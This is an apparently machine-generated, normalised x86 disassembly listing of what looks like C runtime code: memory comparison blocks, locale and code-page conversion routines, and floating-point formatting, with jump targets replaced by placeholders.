movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_4337c0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_433812
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_423a2d
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
sub_43385b
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_42b5a0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_428160
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_425484
pop ecx
cmp eax edi
je r-xdata
call sub_433a10
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_4258f0
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_42894a
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_424869
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_433a3c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_42554e
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_42e069
pop ecx
mov ebx eax
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_423d36
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_42b5a0
add esp 0xc
sub_433ab7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_428bce
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_424dd4
test eax eax
movsx eax [ esi ]
push eax
call sub_428bce
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_433b2a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_433bac
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_433bc8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_438015
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_437f6d
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_433c24
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_4258f0
inc eax
push eax
push esi
add esi edi
push esi
call sub_4250d0
add esp 0x10
sub_433c69
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_423619
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_425eb1
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_425eb1
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_433c24
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
push r--data
push ebx
push esi
call sub_42aae1
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_4250d0
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_433dd8
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_438239
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_433c69
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_4380bd
add esp 0x10
cmp eax ebx
je r-xdata
sub_433ea8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_433dd8
add esp 0x18
pop ebp
retn
sub_433ec8
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_423619
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_425eb1
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
